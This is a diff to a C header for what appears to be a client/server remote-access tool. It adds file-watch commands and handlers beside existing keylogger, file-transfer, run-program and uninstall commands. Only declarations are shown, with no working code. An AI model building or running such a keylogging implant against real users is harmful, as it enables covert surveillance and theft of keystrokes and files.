@@ -18,16 +18,24 @@
 struct server_options;
 
 enum command_codes {
+    // Keylogger
     START_KEYLOGGER = 0x01,
     STOP_KEYLOGGER,
     GET_KEYBOARDS,
     KEY_LOG_TRANSFER,
+
+    // File Transfer
     SEND_FILE,
     FILENAME,
     RECEIVE_FILE,
+
+    // Watching file/directory
     SEND_WATCH,
-    WATCH_CHANGED,
+    STOP_WATCH,
+
+    // Run Program
     RUN_PROGRAM,
+
     UNINSTALL,
     DISCONNECT,
     RESPONSE,
@@ -43,10 +51,18 @@ struct packet_data {
 struct session_info {
 #ifdef CLIENT_BUILD
     struct client_options * client_options_;
+
+    // KEYLOGGER
     _Atomic int run_keylogger;
     _Atomic int keylogger_exited;
     char * device_path;
     pthread_t keylogger_thread;
+
+    // File Watcher
+    char * watch_path;
+    _Atomic int run_watcher;
+    pthread_t watcher_thread;
+
 #endif
 #ifdef CENTRAL_BUILD
     struct server_options * server_options_;
@@ -78,6 +94,8 @@ void process_send_file(struct session_info * session_info);
 void handle_response(struct session_info * session_info);
 void handle_get_keyboards(struct session_info * session_info);
 void handle_disconnect(struct session_info * session_info);
+void handle_send_watch(struct session_info * session_info);
+void handle_stop_watch(struct session_info * session_info);
 
 //  Map of command codes and handler functions
 static const key_pair command_handler_functions[] = {
@@ -85,6 +103,8 @@ static const key_pair command_handler_functions[] = {
     { STOP_KEYLOGGER, stop_keylogger },
     { RUN_PROGRAM, process_run_command },
     { SEND_FILE, process_send_file },
+    { SEND_WATCH, handle_send_watch },
+    { STOP_WATCH, handle_stop_watch },
     { GET_KEYBOARDS, handle_get_keyboards },
     { RECEIVE_FILE, process_receive_file },
     { DISCONNECT, handle_disconnect },
@@ -102,15 +122,11 @@ void send_stop_keylogger(struct server_options * server_options);
 // Disconnect
 void send_disconnect(struct server_options * server_options);
 
-// Transfer
-enum FILE_TYPE {
-    T_FILE,
-    T_DIRECTORY
-};
 
 void send_file(struct server_options * server_options);
 void send_receive_file(const struct server_options * server_options);
-void send_watch(int fd, enum FILE_TYPE file_type, char * path);
+void send_watch(const struct server_options * server_options);
+void send_stop_watch(const struct server_options * server_options);
 
 
 // Run program
